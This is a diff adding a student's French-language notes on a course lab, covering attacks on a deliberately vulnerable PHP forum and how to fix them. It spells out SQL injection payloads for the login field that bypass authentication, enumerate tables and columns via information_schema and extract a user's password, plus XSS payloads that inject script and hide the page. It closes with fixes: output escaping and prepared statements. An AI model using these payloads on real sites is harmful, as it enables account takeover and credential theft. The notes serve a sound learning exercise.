@@ -1,0 +1,29 @@
+-----
+hack :
+-----
+
+1) poster un message sans connaitre le mdp ni login : il suffit de mettre ' or 1=1 --  (avec un espace après --) dans le login, n'importe quoi dans le mdp et une phrase dans le message
+
+2) récupérer le nom de la bdd : il suffit de mettre  ' union select * from toto -- (avec un espace après --) dans le legin n'importe quoi dans le mdp et le message. Un message d'erreur apparait : SQLSTATE[42S02]: Base table or view not found: 1146 Table 'ex2.toto' doesn't exist. On sait alors que ça s'appelle "ex2" car une discussion a été ajouté avec le peudo ex2
+
+3) la faut réfléchir : dans le cours y a marqué qu'il faut faire cela dans le login ' union select table_name from information_schema.tables where table_schema='ex2' --  
+mais la on aura juste le nom de la première table à savoir "forum" qui s'affiche comme pseudo d'une discussion (j'ai enlevé les 3 null du début de requete comme fait dans le cours car ici a gauche du select il n'y a qu'un seul champs donc pas la peine de faire select table_name,null,null,null). 
+
+Du coup mainteant qu'on sait que c'est forum qui est le nom de la table des discussions on met ça dans le login pour récupérer l'autre table  ' union select table_name from information_schema.tables where table_schema='ex2' and table_name!='forum' --  et la magic le nom de la table user apparait comme pseudo d'une discussion 
+
+4)  la faut réfléchir : comme dans le cours on met ça dans login ' union SELECT COLUMN_NAME  FROM information_schema.columns  where table_name='user'  --  et n'importe quoi ailleurs. On aura le premier champs : id. Puis pour avoir le reste on refait ' union SELECT COLUMN_NAME  FROM information_schema.columns  where table_name='user'  and column_name!='id'--  on aura la colonne "mdp" puis ' union SELECT COLUMN_NAME  FROM information_schema.columns  where table_name='user'  and column_name!='id' and column_name!='mdp'-- on aura la colonne "nom"
+
+5) on connait la table user et la colonne mdp et la colonne nom donc on met ça dans le login ' union select mdp from user where nom='alain' -- on récupère le mot de passe puis on met ' union select id from user where nom='alain' -- pour récupérer le login. 
+
+6) pas facile : la aussi faut réflechier car dans le cours le message des forum est dans des paragraphe alors que la il est dans des values de input. Pour voir la syntaxe il suffit de faire afficher code source de la page. Il faut donc mettre 
+" /> <script> alert("bonjour");</script>    attention à pas mettre des ' au lieu des " sinon ça rentrera en conflit avec les ' de la req d'insertion sql 
+
+7) pas facile : la aussi faut réflechier car dans le cours le message des forum est dans des paragraphe alors que la il est dans des values de input. Il faut donc mettre  
+"/> <style> body{display:none;}</style>
+
+---------
+kill hack
+---------
+
+pour les attaques XSS il suffit d'utiliser dans la vue pour la fonction afficherDiscussion() :  htmlentities($ligne->nom, ENT_QUOTES,"UTF-8") au lieu de juste $ligne->nom
+pour les attaque sql il suffit de passer par deux req préparés : une dans le checkuser et l'autre dans ajouterMessage
